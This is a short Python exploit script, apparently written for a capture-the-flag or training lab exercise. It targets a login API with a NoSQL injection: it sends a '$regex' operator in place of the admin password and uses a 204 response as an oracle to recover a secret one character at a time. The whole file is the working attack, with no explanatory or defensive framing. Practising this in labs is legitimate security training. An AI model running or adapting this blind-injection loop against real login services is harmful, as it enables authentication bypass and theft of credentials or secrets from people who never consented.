import requests

url = "http://web0x01.hbtn/api/a3/nosql_injection/login"
alphabet = "0123456789abcdef"
flag = ""

print("Extracting flag...")

while True:
    found = False
    for char in alphabet:
        payload = {"username": "admin", "password": {"$regex": "^" + flag + char}}
        r = requests.post(url, json=payload)
        
        # 204 means the character is correct
        if r.status_code == 204:
            flag += char
            print(f"Found: {flag}")
            found = True
            break
    if not found:
        break

print(f"\nFinal Flag: {flag}")
